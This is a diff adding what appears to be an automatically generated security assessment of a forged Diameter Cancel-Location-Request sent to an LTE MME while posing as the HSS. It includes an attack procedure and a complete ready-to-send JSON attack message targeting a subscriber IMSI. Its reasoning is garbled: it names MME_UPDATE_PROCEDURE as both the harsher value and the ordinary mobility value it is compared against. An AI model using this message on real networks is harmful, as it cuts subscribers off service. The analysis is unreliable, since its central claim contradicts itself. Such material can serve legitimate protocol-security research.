@@ -1,0 +1,76 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - On S6a, the victim is the **MME** and the spoofed sender role is the **HSS**. Due to Diameter exposure and lack of peer authentication, an Internet attacker can open its own Diameter connection to the MME and send a forged **Cancel-Location-Request (CLR, command code 317)** that the MME accepts as if it came from the HSS.
+
+- **Attacker Capability:**
+  - The attacker can actively craft and send CLR requests, choose the target subscriber identity (for example IMSI in `User-Name`), and receive the corresponding `CLA` on that same connection. The attacker cannot observe or alter legitimate HSS-MME traffic and has no extra NAS, radio, GTP, or IMS capabilities beyond what is unnecessary once the MME accepts the forged CLR.
+
+### **Exploitability Analysis:**
+- `Cancel-Location-Request / Cancellation-Type` is a top-level 3GPP vendor-specific **Enumerated** AVP and is an **authoritative control selector** used directly by the MME while processing CLR. It is not descriptive metadata and not merely a claim about the sender.
+- The forged CLR procedure itself is already dangerous because any accepted CLR can cause UE context cancellation. However, this field still has **incremental field-specific security impact** because changing `Cancellation-Type` changes **which cancellation branch** the MME executes.
+- In particular, setting `Cancellation-Type` to a stronger value such as **`MME_UPDATE_PROCEDURE`** can cause the MME to treat the subscriber as no longer authorized for service, clear location/registration state, and apply detach/denial semantics stronger than ordinary stale-location cleanup. That is materially different from a mobility-driven value such as **`MME_UPDATE_PROCEDURE`**, which mainly indicates that service moved to another MME and typically drives context cleanup only.
+- The causal chain is: forged CLR accepted by MME -> MME reads `Cancellation-Type` as the HSS's authoritative reason -> MME selects the corresponding cancellation logic -> UE/MM context is deleted or invalidated with branch-specific service consequences -> the subscriber experiences loss of service, forced re-attach, or stronger rejection behavior until valid later signaling recreates state.
+- The field is therefore the key control point for the **severity and semantics** of the cancellation. The impact is still per-UE and typically overwriteable by later legitimate attach/TAU and fresh HSS interaction, but that does not remove the immediate exploitability of selecting a harsher cancellation mode.
+
+### **Attack Procedure:**
+- Establish a Diameter connection to the exposed MME while impersonating an HSS peer.
+- Send a forged **CLR (command code 317, S6a/S6d application)** containing the target subscriber identity and a top-level `Cancellation-Type` AVP set to **`MME_UPDATE_PROCEDURE`**.
+- Include the minimum coherent supporting AVPs: `Session-Id`, `Auth-Session-State`, `Origin-Host`, `Origin-Realm`, `Destination-Host`, `Destination-Realm`, `Vendor-Specific-Application-Id`, and `User-Name`.
+- Expected success condition: the MME returns a successful `CLA` and the targeted UE's registration/service state at that MME is cleared or moved into stronger cancellation semantics than a normal mobility-update cancellation.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "flags": ["Request", "Proxiable"],
+    "command_code": 317,
+    "application_id": 16777251
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "value": "fake-hss.example.net;172938225;clr-001"
+    },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    {
+      "name": "Auth-Session-State",
+      "value": 1
+    },
+    {
+      "name": "Origin-Host",
+      "value": "hss.fake-hss.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "value": "fake-hss.example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "value": "mme01.epc.example.net"
+    },
+    {
+      "name": "Destination-Realm",
+      "value": "epc.example.net"
+    },
+    {
+      "name": "User-Name",
+      "value": "001010123456789"
+    },
+    {
+      "name": "Cancellation-Type",
+      "vendor_id": 10415,
+      "value": "MME_UPDATE_PROCEDURE"
+    }
+  ]
+}
+```
+
+### **Classification:**
+EXPLOITABLE
